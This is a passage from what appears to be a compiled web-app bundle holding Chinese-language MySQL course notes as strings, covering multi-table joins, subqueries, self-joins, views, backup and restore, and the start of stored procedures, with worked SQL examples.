us_pro VALUES (NULL,4,3);\r\nINSERT INTO us_pro VALUES (NULL,4,4);\r\nINSERT INTO us_pro VALUES (NULL,4,5);\r\nINSERT INTO us_pro VALUES (NULL,4,6);\r\nINSERT INTO us_pro VALUES (NULL,4,7);\r\n```\r\n\r\n- 架构器图解\r\n\r\n![04](./img/sql/mysql/MySQL进阶-02-授课笔记.assets/04.png)\r\n\r\n#### 2.多表查询-笛卡尔积查询(了解)\r\n\r\n- 有两张表，获取这两个表的所有组合情况\r\n- 要完成多表查询，需要消除这些没有用的数据\r\n- 多表查询格式\r\n\r\n```mysql\r\nSELECT\r\n\t列名列表\r\nFROM\r\n\t表名列表\r\nWHERE\r\n\t条件...\r\n```\r\n\r\n- 笛卡尔积查询\r\n\r\n```mysql\r\n-- 标准语法\r\nSELECT 列名 FROM 表名1,表名2,...;\r\n\r\n-- 查询user表和orderlist表\r\nSELECT * FROM USER,orderlist;\r\n```\r\n\r\n#### 3.多表查询-内连接查询\r\n\r\n- 查询原理\r\n  - 内连接查询的是两张表有交集的部分数据(有主外键关联的数据)\r\n- 显式内连接\r\n\r\n```mysql\r\n-- 标准语法\r\nSELECT 列名 FROM 表名1 [INNER] JOIN 表名2 ON 条件;\r\n\r\n-- 查询用户信息和对应的订单信息\r\nSELECT * FROM USER INNER JOIN orderlist ON user.id=orderlist.uid;\r\nSELECT * FROM USER JOIN orderlist ON user.id=orderlist.uid;\r\n\r\n-- 查询用户信息和对应的订单信息，起别名\r\nSELECT * FROM USER u JOIN orderlist o ON u.id=o.uid;\r\n\r\n-- 查询用户姓名，年龄。和订单编号\r\nSELECT\r\n\tu.`name`,\t-- 姓名\r\n\tu.`age`,\t-- 年龄\r\n\to.`number`\t-- 订单编号\r\nFROM\r\n\tUSER u          -- 用户表\r\nJOIN\r\n\torderlist o     -- 订单表\r\nON \r\n\tu.`id` = o.`uid`;\r\n```\r\n\r\n- 隐式内连接\r\n\r\n```mysql\r\n-- 标准语法\r\nSELECT 列名 FROM 表名1,表名2 WHERE 条件;\r\n\r\n-- 查询用户姓名，年龄。和订单编号\r\nSELECT\r\n\tu.`name`,\t-- 姓名\r\n\tu.`age`,\t-- 年龄\r\n\to.`number`\t-- 订单编号\r\nFROM\r\n\tUSER u,\t\t-- 用户表\r\n\torderlist o     -- 订单表\r\nWHERE\r\n\tu.`id`=o.`uid`;\r\n```\r\n\r\n#### 4.多表查询-外连接查询\r\n\r\n- 左外连接\r\n\r\n  - 查询原理\r\n    - 查询左表的全部数据，和左右两张表有交集部分的数据\r\n  - 基本演示\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  SELECT 列名 FROM 表名1 LEFT [OUTER] JOIN 表名2 ON 条件;\r\n  \r\n  -- 查询所有用户信息，以及用户对应的订单信息\r\n  SELECT\r\n  \tu.`name`,\t-- 姓名\r\n  \tu.`age`,\t-- 年龄\r\n  \to.`number`\t-- 订单编号\r\n  FROM\r\n  \tUSER u          -- 用户表\r\n  LEFT OUTER JOIN\r\n  \torderlist o     -- 订单表\r\n  ON\r\n  \tu.`id`=o.`uid`;\r\n  ```\r\n\r\n- 右外连接\r\n\r\n  - 查询原理\r\n    - 查询右表的全部数据，和左右两张表有交集部分的数据\r\n  - 基本演示\r\n\r\n  ```mysql\r\n  -- 基本语法\r\n  SELECT 列名 FROM 表名1 RIGHT [OUTER] JOIN 表名2 ON 条件;\r\n  \r\n  -- 查询所有订单信息，以及订单所属的用户信息\r\n  SELECT\r\n  \tu.`name`,\t-- 姓名\r\n  \tu.`age`,\t-- 年龄\r\n  \to.`number`\t-- 订单编号\r\n  FROM\r\n  \tUSER u          -- 用户表\r\n  RIGHT OUTER JOIN\r\n  \torderlist o     -- 订单表\r\n  ON\r\n  \tu.`id`=o.`uid`;\r\n  ```\r\n\r\n#### 5.多表查询-子查询\r\n\r\n- 子查询介绍\r\n\r\n  - 查询语句中嵌套了查询语句。我们就将嵌套查询称为子查询！\r\n\r\n- 子查询-结果是单行单列的\r\n\r\n  - 可以作为条件，使用运算符进行判断！\r\n  - 基本演示\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  SELECT 列名 FROM 表名 WHERE 列名=(SELECT 聚合函数(列名) FROM 表名 [WHERE 条件]);\r\n  \r\n  -- 查询年龄最高的用户姓名\r\n  SELECT MAX(age) FROM USER;              -- 查询出最高年龄\r\n  SELECT NAME,age FROM USER WHERE age=26; -- 根据查询出来的最高年龄，查询姓名和年龄\r\n  SELECT NAME,age FROM USER WHERE age = (SELECT MAX(age) FROM USER);\r\n  ```\r\n\r\n- 子查询-结果是多行单列的\r\n\r\n  - 可以作为条件，使用运算符in或not in进行判断！\r\n  - 基本演示\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  SELECT 列名 FROM 表名 WHERE 列名 [NOT] IN (SELECT 列名 FROM 表名 [WHERE 条件]); \r\n  \r\n  -- 查询张三和李四的订单信息\r\n  SELECT id FROM USER WHERE NAME='张三' OR NAME='李四';   -- 查询张三和李四用户的id\r\n  SELECT number,uid FROM orderlist WHERE uid=1 OR uid=2; -- 根据id查询订单\r\n  SELECT number,uid FROM orderlist WHERE uid IN (SELECT id FROM USER WHERE NAME='张三' OR NAME='李四');\r\n  ```\r\n\r\n- 子查询-结果是多行多列的\r\n\r\n  - 可以作为一张虚拟表参与查询！\r\n  - 基本演示\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  SELECT 列名 FROM 表名 [别名],(SELECT 列名 FROM 表名 [WHERE 条件]) [别名] [WHERE 条件];\r\n  \r\n  -- 查询订单表中id大于4的订单信息和所属用户信息\r\n  SELECT * FROM USER u,(SELECT * FROM orderlist WHERE id>4) o WHERE u.id=o.uid;\r\n  ```\r\n\r\n#### 6.多表查询练习\r\n\r\n- 查询用户的编号、姓名、年龄。订单编号\r\n\r\n```mysql\r\n/*\r\n分析：\r\n\t用户的编号、姓名、年龄  user表     订单编号 orderlist表\r\n\t条件：user.id = orderlist.uid\r\n*/\r\nSELECT\r\n\tt1.`id`,\t-- 用户编号\r\n\tt1.`name`,\t-- 用户姓名\r\n\tt1.`age`,\t-- 用户年龄\r\n\tt2.`number`\t-- 订单编号\r\nFROM\r\n\tUSER t1,       -- 用户表\r\n\torderlist t2   -- 订单表\r\nWHERE\r\n\tt1.`id` = t2.`uid`;\r\n```\r\n\r\n- 查询所有的用户。用户的编号、姓名、年龄。订单编号\r\n\r\n```mysql\r\n/*\r\n分析：\r\n\t用户的编号、姓名、年龄 user表     订单编号 orderlist表\r\n\t条件：user.id = orderlist.uid\r\n\t查询所有用户，使用左外连接\r\n*/\r\nSELECT\r\n\tt1.`id`,\t-- 用户编号\r\n\tt1.`name`,\t-- 用户姓名\r\n\tt1.`age`,\t-- 用户年龄\r\n\tt2.`number`\t-- 订单编号\r\nFROM\r\n\tUSER t1        -- 用户表\r\nLEFT OUTER JOIN\r\n\torderlist t2   -- 订单表\r\nON\r\n\tt1.`id` = t2.`uid`;\r\n```\r\n\r\n- 查询所有的订单。用户的编号、姓名、年龄。订单编号\r\n\r\n```mysql\r\n/*\r\n分析：\r\n\t用户的编号、姓名、年龄 user表     订单编号 orderlist表\r\n\t条件：user.id = orderlist.uid\r\n\t查询所有订单，使用右外连接\r\n*/\r\nSELECT\r\n\tt1.`id`,\t-- 用户编号\r\n\tt1.`name`,\t-- 用户姓名\r\n\tt1.`age`,\t-- 用户年龄\r\n\tt2.`number`\t-- 订单编号\r\nFROM\r\n\tUSER t1         -- 用户表\r\nRIGHT OUTER JOIN\r\n\torderlist t2    -- 订单表\r\nON\r\n\tt1.`id` = t2.`uid`;\r\n```\r\n\r\n- 查询用户年龄大于23岁的信息。显示用户的编号、姓名、年龄。订单编号\r\n\r\n```mysql\r\n/*\r\n分析：\r\n\t用户的编号、姓名、年龄 user表     订单编号 orderlist表\r\n\t条件：user.age > 23 AND user.id = orderlist.uid\r\n*/\r\n/*\r\nselect\r\n\tt1.`id`,\t-- 用户编号\r\n\tt1.`name`,\t-- 用户姓名\r\n\tt1.`age`,\t-- 用户年龄\r\n\tt2.`number`\t-- 订单编号\r\nfrom\r\n\tuser t1,     -- 用户表\r\n\torderlist t2 -- 订单表\r\nwhere\r\n\tt1.`age` > 23\r\n\tand\r\n\tt1.`id` = t2.`uid`;\r\n*/\r\nSELECT\r\n\tt1.`id`,\t-- 用户编号\r\n\tt1.`name`,\t-- 用户姓名\r\n\tt1.`age`,\t-- 用户年龄\r\n\tt2.`number`\t-- 订单编号\r\nFROM\r\n\tUSER t1       -- 用户表\r\nLEFT OUTER JOIN\r\n\torderlist t2  -- 订单表\r\nON\r\n\tt1.`id` = t2.`uid`\r\nWHERE\r\n\tt1.`age` > 23;\r\n```\r\n\r\n- 查询张三和李四用户的信息。显示用户的编号、姓名、年龄。订单编号\r\n\r\n```mysql\r\n/*\r\n分析：\r\n\t用户的编号、姓名、年龄 user表     订单编号 orderlist表\r\n\t条件：user.id = orderlist.uid AND user.name IN ('张三','李四');\r\n*/\r\nSELECT\r\n\tt1.`id`,\t-- 用户编号\r\n\tt1.`name`,\t-- 用户姓名\r\n\tt1.`age`,\t-- 用户年龄\r\n\tt2.`number`\t-- 订单编号\r\nFROM\r\n\tUSER t1,        -- 用户表\r\n\torderlist t2    -- 订单表\r\nWHERE\r\n\tt1.`id` = t2.`uid`\r\n\tAND\r\n\t-- (t1.`name` = '张三' OR t1.`name` = '李四');\r\n\tt1.`name` IN ('张三','李四');\r\n```\r\n\r\n- 查询商品分类的编号、分类名称。分类下的商品名称\r\n\r\n```mysql\r\n/*\r\n分析：\r\n\t商品分类的编号、分类名称 category表     分类下的商品名称 product表\r\n\t条件：category.id = product.cid\r\n*/\r\nSELECT\r\n\tt1.`id`,\t-- 分类编号\r\n\tt1.`name`,\t-- 分类名称\r\n\tt2.`name`\t-- 商品名称\r\nFROM\r\n\tcategory t1,\t-- 商品分类表\r\n\tproduct t2\t    -- 商品表\r\nWHERE\r\n\tt1.`id` = t2.`cid`;\r\n```\r\n\r\n- 查询所有的商品分类。商品分类的编号、分类名称。分类下的商品名称\r\n\r\n```mysql\r\n/*\r\n分析：\r\n\t商品分类的编号、分类名称 category表     分类下的商品名称 product表\r\n\t条件：category.id = product.cid\r\n\t查询所有的商品分类，使用左外连接\r\n*/\r\nSELECT\r\n\tt1.`id`,\t-- 分类编号\r\n\tt1.`name`,\t-- 分类名称\r\n\tt2.`name`\t-- 商品名称\r\nFROM\r\n\tcategory t1\t-- 商品分类表\r\nLEFT OUTER JOIN\r\n\tproduct t2\t-- 商品表\r\nON\r\n\tt1.`id` = t2.`cid`;\r\n```\r\n\r\n- 查询所有的商品信息。商品分类的编号、分类名称。分类下的商品名称\r\n\r\n```mysql\r\n/*\r\n分析：\r\n\t商品分类的编号、分类名称 category表     分类下的商品名称 product表\r\n\t条件：category.id = product.cid\r\n\t查询所有的商品信息，使用右外连接\r\n*/\r\nSELECT\r\n\tt1.`id`,\t-- 分类编号\r\n\tt1.`name`,\t-- 分类名称\r\n\tt2.`name`\t-- 商品名称\r\nFROM\r\n\tcategory t1\t-- 商品分类表\r\nRIGHT OUTER JOIN\r\n\tproduct t2\t-- 商品表\r\nON\r\n\tt1.`id` = t2.`cid`;\r\n```\r\n\r\n- 查询所有的用户和所有的商品。显示用户的编号、姓名、年龄。商品名称\r\n\r\n```mysql\r\n/*\r\n分析：\r\n\t用户的编号、姓名、年龄 user表   商品名称 product表   中间表 us_pro\r\n\t条件：us_pro.uid = user.id AND us_pro.pid = product.id\r\n*/\r\nSELECT\r\n\tt1.`id`,\t-- 用户编号\r\n\tt1.`name`,\t-- 用户名称\r\n\tt1.`age`,\t-- 用户年龄\r\n\tt2.`name`\t-- 商品名称\r\nFROM\r\n\tUSER t1,\t-- 用户表\r\n\tproduct t2,\t-- 商品表\r\n\tus_pro t3\t-- 中间表\r\nWHERE\r\n\tt3.`uid` = t1.`id`\r\n\tAND\r\n\tt3.`pid` = t2.`id`;\r\n```\r\n\r\n- 查询张三和李四这两个用户可以看到的商品。显示用户的编号、姓名、年龄。商品名称\r\n\r\n```mysql\r\n/*\r\n分析：\r\n\t用户的编号、姓名、年龄 user表   商品名称 product表   中间表 us_pro\r\n\t条件：us_pro.uid = user.id AND us_pro.pid = product.id AND user.name IN ('张三','李四')\r\n*/\r\nSELECT\r\n\tt1.`id`,\t-- 用户编号\r\n\tt1.`name`,\t-- 用户名称\r\n\tt1.`age`,\t-- 用户年龄\r\n\tt2.`name`\t-- 商品名称\r\nFROM\r\n\tUSER t1,\t-- 用户表\r\n\tproduct t2,\t-- 商品表\r\n\tus_pro t3\t-- 中间表\r\nWHERE\r\n\t(t3.`uid` = t1.`id` AND t3.`pid` = t2.`id`)\r\n\tAND\r\n\t-- (t1.`name` = '张三' or t1.`name` = '李四');\r\n\tt1.`name` IN ('张三','李四');\r\n```\r\n\r\n#### 7.多表查询-自关联查询\r\n\r\n- 自关联查询介绍\r\n  - 同一张表中有数据关联。可以多次查询这同一个表！\r\n- 自关联查询演示\r\n\r\n```mysql\r\n-- 创建员工表\r\nCREATE TABLE employee(\r\n\tid INT PRIMARY KEY AUTO_INCREMENT,\r\n\tNAME VARCHAR(20),\r\n\tmgr INT,\r\n\tsalary DOUBLE\r\n);\r\n-- 添加数据\r\nINSERT INTO employee VALUES (1001,'孙悟空',1005,9000.00),\r\n(1002,'猪八戒',1005,8000.00),\r\n(1003,'沙和尚',1005,8500.00),\r\n(1004,'小白龙',1005,7900.00),\r\n(1005,'唐僧',NULL,15000.00),\r\n(1006,'武松',1009,7600.00),\r\n(1007,'李逵',1009,7400.00),\r\n(1008,'林冲',1009,8100.00),\r\n(1009,'宋江',NULL,16000.00);\r\n\r\n-- 查询所有员工的姓名及其直接上级的姓名，没有上级的员工也需要查询\r\n/*\r\n分析：\r\n\t员工姓名 employee表        直接上级姓名 employee表\r\n\t条件：employee.mgr = employee.id\r\n\t查询左表的全部数据，和左右两张表交集部分数据，使用左外连接\r\n*/\r\nSELECT\r\n\tt1.name,\t-- 员工姓名\r\n\tt1.mgr,\t\t-- 上级编号\r\n\tt2.id,\t\t-- 员工编号\r\n\tt2.name     -- 员工姓名\r\nFROM\r\n\temployee t1  -- 员工表\r\nLEFT OUTER JOIN\r\n\temployee t2  -- 员工表\r\nON\r\n\tt1.mgr = t2.id;\r\n```\r\n\r\n### 四、视图\r\n\r\n#### 1.视图的概念\r\n\r\n- 视图是一种虚拟存在的数据表\r\n- 这个虚拟的表并不在数据库中实际存在\r\n- 作用是将一些比较复杂的查询语句的结果，封装到一个虚拟表中。后期再有相同复杂查询时，直接查询这张虚拟表即可\r\n- 说白了，视图就是将一条SELECT查询语句的结果封装到了一个虚拟表中，所以我们在创建视图的时候，工作重心就要放在这条SELECT查询语句上\r\n\r\n#### 2.视图的好处\r\n\r\n- 简单\r\n  - 对于使用视图的用户不需要关心表的结构、关联条件和筛选条件。因为这张虚拟表中保存的就是已经过滤好条件的结果集\r\n- 安全\r\n  - 视图可以设置权限 , 致使访问视图的用户只能访问他们被允许查询的结果集\r\n- 数据独立\r\n  - 一旦视图的结构确定了，可以屏蔽表结构变化对用户的影响，源表增加列对视图没有影响；源表修改列名，则可以通过修改视图来解决，不会造成对访问者的影响\r\n\r\n#### 3.视图数据准备\r\n\r\n```mysql\r\n-- 创建db7数据库\r\nCREATE DATABASE db7;\r\n\r\n-- 使用db7数据库\r\nUSE db7;\r\n\r\n-- 创建country表\r\nCREATE TABLE country(\r\n\tid INT PRIMARY KEY AUTO_INCREMENT,\r\n\tcountry_name VARCHAR(30)\r\n);\r\n-- 添加数据\r\nINSERT INTO country VALUES (NULL,'中国'),(NULL,'美国'),(NULL,'俄罗斯');\r\n\r\n-- 创建city表\r\nCREATE TABLE city(\r\n\tid INT PRIMARY KEY AUTO_INCREMENT,\r\n\tcity_name VARCHAR(30),\r\n\tcid INT, -- 外键列。关联country表的主键列id\r\n\tCONSTRAINT cc_fk1 FOREIGN KEY (cid) REFERENCES country(id)\r\n);\r\n-- 添加数据\r\nINSERT INTO city VALUES (NULL,'北京',1),(NULL,'上海',1),(NULL,'纽约',2),(NULL,'莫斯科',3);\r\n```\r\n\r\n#### 4.视图的创建\r\n\r\n- 创建视图语法\r\n\r\n```mysql\r\n-- 标准语法\r\nCREATE VIEW 视图名称 [(列名列表)] AS 查询语句;\r\n```\r\n\r\n- 普通多表查询，查询城市和所属国家\r\n\r\n```mysql\r\n-- 普通多表查询，查询城市和所属国家\r\nSELECT\r\n\tt1.*,\r\n\tt2.country_name\r\nFROM\r\n\tcity t1,\r\n\tcountry t2\r\nWHERE\r\n\tt1.cid = t2.id;\r\n\t\r\n-- 经常需要查询这样的数据，就可以创建一个视图\r\n```\r\n\r\n- 创建视图基本演示\r\n\r\n```mysql\r\n-- 创建一个视图。将查询出来的结果保存到这张虚拟表中\r\nCREATE\r\nVIEW\r\n\tcity_country\r\nAS\r\n\tSELECT t1.*,t2.country_name FROM city t1,country t2 WHERE t1.cid=t2.id;\r\n```\r\n\r\n- 创建视图并指定列名基本演示\r\n\r\n```mysql\r\n-- 创建一个视图，指定列名。将查询出来的结果保存到这张虚拟表中\r\nCREATE\r\nVIEW\r\n\tcity_country2 (city_id,city_name,cid,country_name) \r\nAS\r\n\tSELECT t1.*,t2.country_name FROM city t1,country t2 WHERE t1.cid=t2.id;\r\n\r\n```\r\n\r\n#### 5.视图的查询\r\n\r\n- 查询视图语法\r\n\r\n```mysql\r\n-- 标准语法\r\nSELECT * FROM 视图名称;\r\n```\r\n\r\n- 查询视图基本演示\r\n\r\n```mysql\r\n-- 查询视图。查询这张虚拟表，就等效于查询城市和所属国家\r\nSELECT * FROM city_country;\r\n\r\n-- 查询指定列名的视图\r\nSELECT * FROM city_country2;\r\n\r\n-- 查询所有数据表，视图也会查询出来\r\nSHOW TABLES;\r\n```\r\n\r\n- 查询视图创建语法\r\n\r\n```mysql\r\n-- 标准语法\r\nSHOW CREATE VIEW 视图名称;\r\n```\r\n\r\n- 查询视图创建语句基本演示\r\n\r\n```mysql\r\nSHOW CREATE VIEW city_country;\r\n```\r\n\r\n#### 6.视图的修改\r\n\r\n- 修改视图表中的数据\r\n\r\n```mysql\r\n-- 标准语法\r\nUPDATE 视图名称 SET 列名=值 WHERE 条件;\r\n\r\n-- 修改视图表中的城市名称北京为北京市\r\nUPDATE city_country SET city_name='北京市' WHERE city_name='北京';\r\n\r\n-- 查询视图\r\nSELECT * FROM city_country;\r\n\r\n-- 查询city表,北京也修改为了北京市\r\nSELECT * FROM city;\r\n\r\n-- 注意：视图表数据修改，会自动修改源表中的数据\r\n```\r\n\r\n- 修改视图表结构\r\n\r\n```mysql\r\n-- 标准语法\r\nALTER VIEW 视图名称 [(列名列表)] AS 查询语句;\r\n\r\n-- 查询视图2\r\nSELECT * FROM city_country2;\r\n\r\n-- 修改视图2的列名city_id为id\r\nALTER\r\nVIEW\r\n\tcity_country2 (id,city_name,cid,country_name)\r\nAS\r\n\tSELECT t1.*,t2.country_name FROM city t1,country t2 WHERE t1.cid=t2.id;\r\n```\r\n\r\n#### 7.视图的删除\r\n\r\n- 删除视图\r\n\r\n```mysql\r\n-- 标准语法\r\nDROP VIEW [IF EXISTS] 视图名称;\r\n\r\n-- 删除视图\r\nDROP VIEW city_country;\r\n\r\n-- 删除视图2，如果存在则删除\r\nDROP VIEW IF EXISTS city_country2;\r\n```\r\n\r\n#### 8.视图的总结\r\n\r\n- 视图是一种虚拟存在的数据表\r\n- 这个虚拟的表并不在数据库中实际存在\r\n- 说白了，视图就是将一条SELECT查询语句的结果封装到了一个虚拟表中，所以我们在创建视图的时候，工作重心就要放在这条SELECT查询语句上\r\n- 视图的好处\r\n  - 简单\r\n  - 安全\r\n  - 数据独立\r\n\r\n### 五、备份与还原\r\n\r\n#### 1.命令行方式\r\n\r\n- 备份\r\n\r\n  - 使用SecureCRT工具连接到Linux系统，输入：mysqldump -u root -p 数据库名称 > 文件保存路径\r\n\r\n  ![12](./img/sql/mysql/MySQL进阶-02-授课笔记.assets/12.png)\r\n\r\n  - 进入文件保存路径，查看文件是否存在\r\n\r\n  ![13](./img/sql/mysql/MySQL进阶-02-授课笔记.assets/13.png)\r\n\r\n  ![14](./img/sql/mysql/MySQL进阶-02-授课笔记.assets/14.png)\r\n\r\n- 恢复\r\n\r\n  - 登录mysql数据库\r\n\r\n  ![15](./img/sql/mysql/MySQL进阶-02-授课笔记.assets/15.png)\r\n\r\n  - 删除已经备份的数据库\r\n\r\n  ![16](./img/sql/mysql/MySQL进阶-02-授课笔记.assets/16.png)\r\n\r\n  - 重新创建名称相同的数据库\r\n\r\n  ![17](./img/sql/mysql/MySQL进阶-02-授课笔记.assets/17.png)\r\n\r\n  - 使用该数据库\r\n\r\n  ![18](./img/sql/mysql/MySQL进阶-02-授课笔记.assets/18.png)\r\n\r\n  - 导入文件执行：source 备份文件路径;\r\n\r\n  ![19](./img/sql/mysql/MySQL进阶-02-授课笔记.assets/19.png)\r\n\r\n#### 2.图形化界面方式\r\n\r\n- 备份\r\n\r\n![05](./img/sql/mysql/MySQL进阶-02-授课笔记.assets/05.png)\r\n\r\n![06](./img/sql/mysql/MySQL进阶-02-授课笔记.assets/06.png)\r\n\r\n![07](./img/sql/mysql/MySQL进阶-02-授课笔记.assets/07.png)\r\n\r\n- 恢复\r\n\r\n![08](./img/sql/mysql/MySQL进阶-02-授课笔记.assets/08.png)\r\n\r\n![09](./img/sql/mysql/MySQL进阶-02-授课笔记.assets/09.png)\r\n\r\n![10](./img/sql/mysql/MySQL进阶-02-授课笔记.assets/10.png)\r\n\r\n![11](./img/sql/mysql/MySQL进阶-02-授课笔记.assets/11.png)\r\n\r\n",Q={data:function(){return{MainComponent:V}}},K=Q,X=Object(u["a"])(K,$,G,!1,null,"4e40c8a8",null),Y=X.exports,Z=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},nn=[],rn="# MySQL高级-03-授课笔记\r\n\r\n### 一、MySQL存储过程和函数\r\n\r\n#### 1.存储过程和函数的概念\r\n\r\n- 存储过程和函数是  事先经过编译并存储在数据库中的一段 SQL 语句的集合\r\n\r\n#### 2.存储过程和函数的好处\r\n\r\n- 存储过程和函数可以重复使用，减轻开发人员的工作量。类似于java中方法可以多次调用\r\n- 减少网络流量，存储过程和函数位于服务器上，调用的时候只需要传递名称和参数即可\r\n- 减少数据在数据库和应用服务器之间的传输，可以提高数据处理的效率\r\n- 将一些业务逻辑在数据库层面来实现，可以减少代码层面的业务处理\r\n\r\n#### 3.存储过程和函数的区别\r\n\r\n- 函数必须有返回值\r\n- 存储过程没有返回值\r\n\r\n#### 4.创建存储过程\r\n\r\n- 小知识\r\n\r\n```mysql\r\n/*\r\n\t该关键字用来声明sql语句的分隔符，告诉MySQL该段命令已经结束！\r\n\tsql语句默认的分隔符是分号，但是有的时候我们需要一条功能sql语句中包含分号，但是并不作为结束标识。\r\n\t这个时候就可以使用DELIMITER来指定分隔符了！\r\n*/\r\n-- 标准语法\r\nDELIMITER 分隔符\r\n```\r\n\r\n- 数据准备\r\n\r\n```mysql\r\n-- 创建db8数据库\r\nCREATE DATABASE db8;\r\n\r\n-- 使用db8数据库\r\nUSE db8;\r\n\r\n-- 创建学生表\r\nCREATE TABLE student(\r\n\tid INT PRIMARY KEY AUTO_INCREMENT,\t-- 学生id\r\n\tNAME VARCHAR(20),\t\t\t\t\t-- 学生姓名\r\n\tage INT,\t\t\t\t\t\t\t-- 学生年龄\r\n\tgender VARCHAR(5),\t\t\t\t\t-- 学生性别\r\n\tscore INT                           -- 学生成绩\r\n);\r\n-- 添加数据\r\nINSERT INTO student VALUES (NULL,'张三',23,'男',95),(NULL,'李四',24,'男',98),\r\n(NULL,'王五',25,'女',100),(NULL,'赵六',26,'女',90);\r\n\r\n-- 按照性别进行分组，查询每组学生的总成绩。按照总成绩的升序排序\r\nSELECT gender,SUM(score) getSum FROM student GROUP BY gender ORDER BY getSum ASC;\r\n```\r\n\r\n- 创建存储过程语法\r\n\r\n```mysql\r\n-- 修改分隔符为$\r\nDELIMITER $\r\n\r\n-- 标准语法\r\nCREATE PROCEDURE 存储过程名称(参数...)\r\nBEGIN\r\n\tsql语句;\r\nEND$\r\n\r\n-- 修改分隔符为分号\r\nDELIMITER ;\r\n```\r\n\r\n- 创建存储过程\r\n\r\n```mysql\r\n-- 修改分隔符为$\r\nDELIMITER $\r\n\r\n-- 创建存储过程，封装分组查询学生总成绩的sql语句\r\nCREATE PROCEDURE stu_group()\r\nBEGIN\r\n\tSELECT gender,SUM(score) getSum FROM student GROUP BY gender ORDER BY getSum ASC;\r\nEND$\r\n\r\n-- 修改分隔符为分号\r\nDELIMITER ;\r\n```\r\n\r\n#### 5.调用存储过程\r\n\r\n- 调用存储过程语法\r\n\r\n```mysql\r\n-- 标准语法\r\nCALL 存储过程名称(实际参数);\r\n\r\n-- 调用stu_group存储过程\r\nCALL stu_group();\r\n```\r\n\r\n#### 6.查看存储过程\r\n\r\n- 查看存储过程语法\r\n\r\n```mysql\r\n-- 查询数据库中所有的存储过程 标准语法\r\nSELECT * FROM mysql.proc WHERE db='数据库名称';\r\n```\r\n\r\n#### 7.删除存储过程\r\n\r\n- 删除存储过程语法\r\n\r\n```mysql\r\n-- 标准语法\r\nDROP PROCEDURE [IF EXISTS] 存储过程名称;\r\n\r\n-- 删除stu_group存储过程\r\nDROP PROCEDURE stu_group;\r\n```\r\n\r\n#### 8.存储过程语法\r\n\r\n##### 8.1存储过程语法介绍\r\n\r\n- 存储过程是可以进行编程的。意味着可以使用变量、表达式、条件控制语句、循环语句等，来完成比较复杂的功能！\r\n\r\n##### 8.2变量的使用\r\n\r\n- 定义变量\r\n\r\n```mysql\r\n-- 标准语法\r\nDECLARE 变量名 数据类型 [DEFAULT 默认值];\r\n-- 注意： DECLARE定义的是局部变量，只能用在BEGIN END范围之内\r\n\r\n-- 定义一个int类型变量、并赋默认值为10\r\nDELIMITER $\r\n\r\nCREATE PROCEDURE pro_test1()\r\nBEGIN\r\n\tDECLARE num INT DEFAULT 10;   -- 定义变量\r\n\tSELECT num;                   -- 查询变量\r\nEND$\r\n\r\nDELIMITER ;\r\n\r\n-- 调用pro_test1存储过程\r\nCALL pro_test1();\r\n```\r\n\r\n- 变量的赋值1\r\n\r\n```mysql\r\n-- 标准语法\r\nSET 变量名 = 变量值;\r\n\r\n-- 定义字符串类型变量，并赋值\r\nDELIMITER $\r\n\r\nCREATE PROCEDURE pro_test2()\r\nBEGIN\r\n\tDECLARE NAME VARCHAR(10);   -- 定义变量\r\n\tSET NAME = '存储过程';       -- 为变量赋值\r\n\tSELECT NAME;                -- 查询变量\r\nEND$\r\n\r\nDELIMITER ;\r\n\r\n-- 调用pro_test2存储过程\r\nCALL pro_test2();\r\n```\r\n\r\n- 变量的赋值2\r\n\r\n```mysql\r\n-- 标准语法\r\nSELECT 列名 INTO 变量名 FROM 表名 [WHERE 条件];\r\n\r\n-- 定义两个int变量，用于存储男女同学的总分数\r\nDELIMITER $\r\n\r\nCREATE PROCEDURE pro_test3()\r\nBEGIN\r\n\tDECLARE men,women INT;  -- 定义变量\r\n\tSELECT SUM(score) INTO men FROM student WHERE gender='男';    -- 计算男同学总分数赋值给men\r\n\tSELECT SUM(score) INTO women FROM student WHERE gender='女';  -- 计算女同学总分数赋值给women\r\n\tSELECT men,women;           -- 查询变量\r\nEND$\r\n\r\nDELIMITER ;\r\n\r\n-- 调用pro_test3存储过程\r\nCALL pro_test3();\r\n```\r\n\r\n##### 8.3if语句的使用\r\n\r\n- 标准语法\r\n\r\n```mysql\r\n-- 标准语法\r\nIF 判断条件1 THEN 执行的sql语句1;\r\n[ELSEIF 判断条件2 THEN 执行的sql语句2;]\r\n...\r\n[ELSE 执行的sql语句n;]\r\nEND IF;\r\n```\r\n\r\n- 案例演示\r\n\r\n```mysql\r\n/*\r\n\t定义一个int变量，用于存储班级总成绩\r\n\t定义一个varchar变量，用于存储分数描述\r\n\t根据总成绩判断：\r\n\t\t380分及以上    学习优秀\r\n\t\t320 ~ 380     学习不错\r\n\t\t320以下       学习一般\r\n*/\r\nDELIMITER $\r\n\r\nCREATE PROCEDURE pro_test4()\r\nBEGIN\r\n\t-- 定义总分数变量\r\n\tDECLARE total INT;\r\n\t-- 定义分数描述变量\r\n\tDECLARE description VARCHAR(10);\r\n\t-- 为总分数变量赋值\r\n\tSELECT SUM(score) INTO total FROM student;\r\n\t-- 判断总分数\r\n\tIF total >= 380 THEN \r\n\t\tSET description = '学习优秀';\r\n\tELSEIF total >= 320 AND total < 380 THEN \r\n\t\tSET description = '学习不错';\r\n\tELSE \r\n\t\tSET description = '学习一般';\r\n\tEND IF;\r\n\t\r\n\t-- 查询总成绩和描述信息\r\n\tSELECT total,description;\r\nEND$\r\n\r\nDELIMITER ;\r\n\r\n-- 调用pro_test4存储过程\r\nCALL pro_test4();\r\n```\r\n\r\n##### 8.4参数的传递\r\n\r\n- 参数传递的语法\r\n\r\n```mysql\r\nDELIMITER $\r\n\r\n-- 标准语法\r\nCREATE PROCEDURE 存储过程名称([IN|OUT|INOUT] 参数名 数据类型)\r\nBEGIN\r\n\t执行的sql语句;\r\nEND$\r\n/*\r\n\tIN:代表输入参数，需要由调用者传递实际数据。默认的\r\n\tOUT:代表输出参数，该参数可以作为返回值\r\n\tINOUT:代表既可以作为输入参数，也可以作为输出参数\r\n*/\r\nDELIMITER ;\r\n```\r\n\r\n- 输入参数\r\n\r\n  - 标准语法\r\n\r\n  ```mysql\r\n  DELIMITER $\r\n  \r\n  -- 标准语法\r\n  CREATE PROCEDURE 存储过程名称(IN 参数名 数据类型)\r\n  BEGIN\r\n  